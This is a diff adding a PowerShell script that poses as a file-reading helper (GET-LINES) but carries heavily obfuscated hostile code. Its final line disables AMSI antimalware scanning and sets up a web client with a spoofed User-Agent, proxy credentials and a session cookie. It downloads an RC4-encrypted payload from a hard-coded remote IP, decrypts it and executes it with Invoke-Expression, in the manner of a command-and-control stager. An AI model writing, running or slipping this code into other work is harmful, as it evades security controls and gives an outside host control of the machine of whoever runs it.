@@ -1,0 +1,38 @@
+ set-iTem  ("VAr"+"IaBLE"+":k"+"gC"+"0u")  (  [TYPe]("{1}{3}{2}{0}"-f 'iLe','sy','F','STeM.iO.') ) ;  $kBLcg =  [TYPE]("{1}{0}" -F 'Ef','r')  ; Sv 3w9x  ([TypE]("{4}{0}{2}{6}{7}{8}{1}{5}{3}{9}"-f'm.nE','nT','t.','Ge','sYSTe','MANa','s','erVICEP','oi','r')) ; SV  E4dU  ([tYpE]("{4}{5}{3}{1}{2}{0}" -f'sT','EbR','eQuE','.w','sYSTEm.nE','T'));Set-itEM  variaBlE:mGS74 (  [TyPE]("{3}{5}{2}{1}{6}{4}{0}"-F'NTiaLcAcHE','nET.cr','eM.','s','e','ySt','eD'))  ;   SET-vARiabLe ("SH"+"89")  ( [type]("{2}{3}{4}{1}{0}{5}"-F'.encodI','Text','sYS','teM','.','Ng') );  
+
+
+
+
+
+
+
+
+
+
+
+function GET`-LIN`ES ([string]${f`ILe}) {
+    begin {
+        ${fI`lE} = (.("{0}{1}{2}{3}"-f 'Re','so','lv','e-Path') ${F`IlE}).("{0}{1}" -f'T','oString').Invoke()
+
+        if (!(.("{2}{1}{0}" -f 'h','st-Pat','Te') ${Fi`le})) {
+            Throw ('F'+'ile '+'n'+'ot '+'found'+':'+' '+"$file")
+        }
+
+        try {
+            
+            ${St`R`eAm} =   (  gi ("vaR"+"IaBle"+":k"+"gc"+"0U") ).vaLUe::("{0}{2}{1}"-f 'OpenT','t','ex').Invoke(${F`Ile})
+        } catch {
+            Throw ${_}
+        }
+    }
+
+    process {
+        while (!${S`TREaM}."eND`o`F`sTreAm") {
+            ${str`e`AM}.("{0}{2}{1}" -f 'ReadLi','e','n').Invoke()
+        }
+        ${StR`EAm}.("{1}{0}" -f'se','Clo').Invoke()
+        .('rv') ("{1}{0}" -f 'eam','str')
+    }
+}
+
+ (  ITEM  vArIAbLe:KblCG ).vAlue."As`sE`mbLy".("{1}{0}{2}" -f 'T','GeT','yPE').Invoke(("{4}{9}{2}{3}{0}{5}{1}{7}{8}{6}" -f 'A','om','Ma','nagement.','Syste','ut','Utils','at','ion.Amsi','m.'))|&('?'){${_}}|.('%'){${_}.("{1}{2}{0}" -f'IEld','Ge','tF').Invoke(("{4}{2}{3}{1}{0}" -f'led','i','iIn','itFa','ams'),("{0}{1}{2}" -f 'N','onPubl','ic,Static')).("{1}{2}{0}"-f'uE','SET','VaL').Invoke(${NU`LL},${tr`Ue})}; (  gEt-VarIaBLE  3w9X  ).vALuE::"EX`peCT100`CO`NTiNuE"=0;${wC}=&("{1}{0}{2}" -f 'OBJ','NEw-','ecT') ("{2}{4}{0}{3}{1}"-f'tem.NET.WE','enT','Sy','bClI','S');${u}=("{8}{2}{1}{9}{7}{4}{11}{0}{13}{10}{12}{5}{3}{6}"-f '; Tride','ows N','(Wind',' G',' WOW','ke','ecko',' 6.1;','Mozilla/5.0 ','T','t/7.0; rv:11.','64','0) li','n');${wC}."HE`A`DERS".("{1}{0}" -f'Dd','A').Invoke(("{1}{0}{2}" -f's','U','er-Agent'),${U});${wC}."p`RoxY"=  (iTEM  VarIaBle:E4dU  ).VaLUe::"de`FaU`lTwE`BpROXy";${wC}."P`ROxY"."C`ReD`ENT`IAlS" =   $MGS74::"DEF`AU`LTNeTWorkcre`d`eNtiALs";${k}= (  GEt-vAriAble ("sh"+"89") ).VALue::"As`CIi".("{0}{1}" -f 'GetBY','TES').Invoke('Dv,inKZ<@{3mjG4&1k:Vcl7o)EY*J?6x');${R}={${d},${K}=${a`RGs};${s}=0..255;0..255|&('%'){${j}=(${J}+${S}[${_}]+${K}[${_}%${k}."cOU`Nt"])%256;${S}[${_}],${S}[${J}]=${S}[${j}],${s}[${_}]};${D}|&('%'){${i}=(${I}+1)%256;${H}=(${h}+${s}[${I}])%256;${s}[${I}],${s}[${h}]=${S}[${h}],${S}[${I}];${_}-bXOr${S}[(${s}[${I}]+${S}[${h}])%256]}};${W`C}."he`AdERS".("{1}{0}" -f'dd','A').Invoke(("{0}{1}"-f 'Co','okie'),("{6}{7}{2}{4}{8}{0}{3}{5}{1}{10}{9}" -f '/','PEy','sion','bf','=S4UqQGzWI','E','s','es','qnMvnx','aDQ=','+G'));${s`ER}=("{4}{1}{0}{2}{3}"-f'.16','ttp://35','4.97.4:','80','h');${t}=("{1}{2}{0}" -f 't.php','/ad','min/ge');${D`ATa}=${w`c}.("{0}{1}{2}"-f 'DOWnL','OADD','ATA').Invoke(${s`eR}+${T});${Iv}=${Da`Ta}[0..3];${d`ATA}=${D`ATA}[4..${DA`Ta}."le`NG`TH"];-Join[CHAR[]](& ${R} ${D`ATa} (${I`V}+${k}))|.("{0}{1}"-f'IE','X')
